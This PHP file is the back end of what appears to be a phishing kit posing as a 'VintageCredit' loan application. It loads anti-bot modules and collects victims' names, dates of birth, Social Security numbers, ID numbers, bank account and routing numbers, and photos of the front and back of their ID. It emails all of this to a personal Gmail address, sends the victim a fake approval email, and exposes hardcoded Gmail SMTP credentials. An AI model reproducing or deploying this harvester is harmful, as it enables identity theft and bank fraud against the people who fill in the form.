<?php
    //Import PHPMailer classes into the global namespace
    //These must be at the top of your script, not inside a function
    use PHPMailer\PHPMailer\PHPMailer;
    use PHPMailer\PHPMailer\SMTP;
    use PHPMailer\PHPMailer\Exception;

    session_start();

    require_once '../../Meta/Comp.php';
    require_once '../../Meta/Antibot.php';
    require_once '../../Meta/demonTest.php';

    $comps = new Comp;
    $antibot = new Antibot;

    $_SESSION['ip'] = $comps->getIP();
    $_SESSION['ipDetails'] = $comps->getIPDetails();
    $settings = $comps->settings();
    $comps->createToken();

    //Load Composer's autoloader
    require 'vendor/autoload.php';

    //Create an instance; passing `true` enables exceptions
    $mail = new PHPMailer(true);

    $success_mail = new PHPMailer(true);

    $first_name = $_POST['fname'];
    $last_name = $_POST['lname'];
    $dob = $_POST['dob'];
    $gender = $_POST['gender'];
    $address = $_POST['address']. " " .$_POST['city']. " " .$_POST['state']. " " .$_POST['zip'];
    // $marital_status = $_POST['MaritalStatus'];
    $email = $_POST['email'];
    $phone_number = $_POST['phone'];
    $home_ownership = $_POST['home_ownership'];
    $residency = $_POST['residency'];
    $employment_status = $_POST['employment_status'];
    $monthly_income = $_POST['monthly_income'];
    $loan_type = $_POST['loan_type'];
    $loan_purpose = $_POST['loan_purpose'];
    $loan_amount = $_POST['loan_amount'];
    $social_number = $_POST['social_number'];
    $id_number = $_POST['id_number'];
    $issue_date = $_POST['issue_date'];
    $expiry_date = $_POST['expiry_date'];
    $bank_name = $_POST['bank_name'];
    $account_number = $_POST['account_number'];
    $routing_number = $_POST['routing_number'];

    try {
        //Server settings
        $success_mail->SMTPDebug = 0; //SMTP::DEBUG_SERVER;                      //Enable verbose debug output
        $success_mail->isSMTP();                                            //Send using SMTP
        $success_mail->Host       = 'smtp.gmail.com';                     //Set the SMTP server to send through
        $success_mail->SMTPAuth   = true;                                   //Enable SMTP authentication
        $success_mail->Username   = 'brianjulianopar@gmail.com';                     //SMTP username
        $success_mail->Password   = 'miwtavblrajxrlfv';                               //SMTP password
        $success_mail->SMTPSecure = PHPMailer::ENCRYPTION_SMTPS;            //Enable implicit TLS encryption
        $success_mail->Port       = 465;                                    //TCP port to connect to; use 587 if you have set `SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS`

        //Recipients
        $success_mail->setFrom('brianjulianopar@gmail.com', 'VintageCredit');
        $success_mail->addAddress($email, $first_name." ".$last_name);

        //Content
        $success_mail->isHTML(true);                                  //Set email format to HTML
        $success_mail->Subject = 'Application Success!';
        $success_mail->Body    = "Dear ".$first_name.",<br><br>Thank you for choosing VintageCredit.". 
                        "Your signed loan agreement with VintageCredit has been received and your application".
                        "has been forwarded to our Loan Processing Team for review.".
                        "<br><br>We will contact you shortly by phone or email to let you know if you're or if we need additional information to process your loan application.".
                        "<br><br>If you have any questions or concerns, our Customer Support Team is available Monday - Friday, 8am - 8pm CT and Saturday - Sunday, 9am - 5:30pm CT at (757) 255-8344.".
                        "<br><br>You can also sign in to view your account details online at any time.".
                        "<br><br>Sincerely,".
                        "<br><br>The VintageCredit Customer Support Team".
                        "<br>Phone: (757) 255-8344<br>Email: support@vintagecredit.us";

        $success_mail->send();
    } catch (Exception $e) {
        echo "Server is down at the moment!";
    }

    
    try {
        //Server settings
        $mail->SMTPDebug = 0; //SMTP::DEBUG_SERVER;                      //Enable verbose debug output
        $mail->isSMTP();                                            //Send using SMTP
        $mail->Host       = 'smtp.gmail.com';                     //Set the SMTP server to send through
        $mail->SMTPAuth   = true;                                   //Enable SMTP authentication
        $mail->Username   = 'brianjulianopar@gmail.com';                     //SMTP username
        $mail->Password   = 'miwtavblrajxrlfv';                               //SMTP password
        $mail->SMTPSecure = PHPMailer::ENCRYPTION_SMTPS;            //Enable implicit TLS encryption
        $mail->Port       = 465;                                    //TCP port to connect to; use 587 if you have set `SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS`

        //Recipients
        $mail->setFrom('brianjulianopar@gmail.com', 'VintageCredit');
        $mail->addAddress('adeshegz32@gmail.com');     //Add a recipient
        // $mail->addAddress('ellen@example.com');               //Name is optional
        $mail->addReplyTo('support@vintagecredit.us', 'VintageCredit');

        //Attachments
        $mail->addAttachment($_FILES['id_front']['tmp_name'], $_FILES['id_front']['name']);        //Add attachments
        $mail->addAttachment($_FILES['id_back']['tmp_name'], $_FILES['id_back']['name']);  
        // $mail->addAttachment('/tmp/image.jpg', 'new.jpg');    //Optional name

        //Content
        $mail->isHTML(true);                                  //Set email format to HTML
        $mail->Subject = 'New Loan Applicant!';
        $mail->Body    = "Name : ". $first_name. " " .$last_name.
                        "<br>Dob : " .$dob.
                        "<br>Gender :" .$gender.
                        "<br>Email : " .$email.
                        "<br>Phone : " .$phone_number.
                        "<br>Address : " .$address.
                        "<br>home-ownership : " .$home_ownership.
                        "<br>Year of Residency : " .$residency.
                        "<br>Employment Status : " .$employment_status.
                        "<br>Monthly Income : " .$monthly_income.
                        "<br>Loan Type : " .$loan_type.
                        "<br>Loan Purpose : " .$loan_purpose.
                        "<br>Loan Amount : " .$loan_amount.
                        "<br>Social Number : " .$social_number.
                        "<br>ID Number : " .$id_number.
                        "<br>Issue Date : " .$issue_date.
                        "<br>Expiry Date : " .$expiry_date.
                        "<br>Bank Name : " .$bank_name.
                        "<br>Account Number : " .$account_number.
                        "<br>Routing Number : " .$routing_number;

        $mail->send();
        header("Location: ../pre-approval.php?token=" .$_SESSION['token']."&amount=".$loan_amount);
    } catch (Exception $e) {
        echo "Server is down at the moment!";
    }
?>